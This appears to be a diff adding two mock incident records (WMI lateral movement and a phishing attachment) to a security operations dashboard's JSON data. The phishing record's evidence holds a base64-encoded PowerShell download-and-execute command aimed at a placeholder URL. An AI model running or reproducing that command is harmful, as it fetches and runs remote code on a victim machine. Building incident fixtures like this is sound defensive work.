@@ -1048,5 +1048,105 @@
         "updatedAt": "2026-05-31T14:54:45.314Z"
       }
     ]
+  },
+  {
+    "_id": "xbmm695",
+    "title": "[AUTO-CONTAINED] Incident Case: Lateral Movement Attempted",
+    "severity": "HIGH",
+    "status": "NEW",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:55:00.332Z",
+    "updatedAt": "2026-05-31T14:55:00.332Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:55:00.332Z",
+        "activity": "Intrusion Alert Fired: Lateral Movement Attempted",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:55:00.332Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "zedq2ab",
+        "timestamp": "2026-05-31T14:55:00.313Z",
+        "severity": "HIGH",
+        "title": "Lateral Movement Attempted",
+        "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+        "category": "Lateral Movement",
+        "host": "WIN-SOC-AD-02",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "protocol": "WMI",
+          "src": "WIN-SOC-DEV-05",
+          "dest": "WIN-SOC-PROD-01",
+          "mitreTactic": "Lateral Movement",
+          "mitreTechnique": "T1021 - Remote Services"
+        },
+        "createdAt": "2026-05-31T14:55:00.315Z",
+        "updatedAt": "2026-05-31T14:55:00.315Z"
+      }
+    ]
+  },
+  {
+    "_id": "v9yr5p4",
+    "title": "[AUTO-CONTAINED] Incident Case: Malicious EML Attachment Opened",
+    "severity": "CRITICAL",
+    "status": "NEW",
+    "assignedTo": "SOAR Automation Engine",
+    "createdAt": "2026-05-31T14:55:15.328Z",
+    "updatedAt": "2026-05-31T14:55:15.328Z",
+    "impact": "Endpoint systems affected. Compromised binaries isolated.",
+    "rootCause": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "recommendations": [
+      "Perform system memory dump analysis",
+      "Revoke active session tokens for associated host accounts",
+      "Re-image device if registry modifications are deep"
+    ],
+    "timeline": [
+      {
+        "timestamp": "2026-05-31T14:55:15.328Z",
+        "activity": "Intrusion Alert Fired: Malicious EML Attachment Opened",
+        "actor": "SIEM Agent"
+      },
+      {
+        "timestamp": "2026-05-31T14:55:15.328Z",
+        "activity": "SOAR Automation Executed Containment Strategy",
+        "actor": "SOAR Bot"
+      }
+    ],
+    "evidence": [
+      {
+        "_id": "lgvrxj9",
+        "timestamp": "2026-05-31T14:55:15.314Z",
+        "severity": "CRITICAL",
+        "title": "Malicious EML Attachment Opened",
+        "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+        "category": "Phishing",
+        "host": "WIN-SOC-DEV-05",
+        "status": "NEW",
+        "assignedTo": "Unassigned",
+        "evidence": {
+          "parent": "outlook.exe",
+          "process": "powershell.exe",
+          "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+          "mitreTactic": "Initial Access",
+          "mitreTechnique": "T1566 - Phishing"
+        },
+        "createdAt": "2026-05-31T14:55:15.315Z",
+        "updatedAt": "2026-05-31T14:55:15.315Z"
+      }
+    ]
   }
 ]
